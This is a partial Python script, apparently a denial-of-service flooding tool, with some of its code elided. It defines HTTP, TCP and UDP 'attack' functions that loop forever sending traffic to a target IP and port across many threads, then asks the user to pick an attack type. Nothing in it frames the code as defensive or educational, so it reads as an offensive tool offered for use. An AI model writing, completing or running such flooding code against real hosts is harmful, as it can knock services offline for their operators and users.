    ...
    def attack():
        while True:
            try:
                ...
                print(GREEN + f"[HTTP] Sent -> {target}:{port} | UA: {ua}" + RESET)
            except:
                print(RED + "[HTTP] Failed" + RESET)
    ...
    def attack():
        while True:
            try:
                ...
                s.connect((ip, port))
                s.send(data)
                print(GREEN + f"[TCP] Sent -> {ip}:{port}" + RESET)
                s.close()
            except:
                print(RED + "[TCP] Failed" + RESET)
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    ...
    def attack():
        ...
        while True:
            try:
                ...
                print(GREEN + f"[UDP] Sent -> {ip}:{port}" + RESET)
            except:
                print(RED + "[UDP] Failed" + RESET)
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
...
choice = input(YELLOW + "Choose attack type: " + RESET)
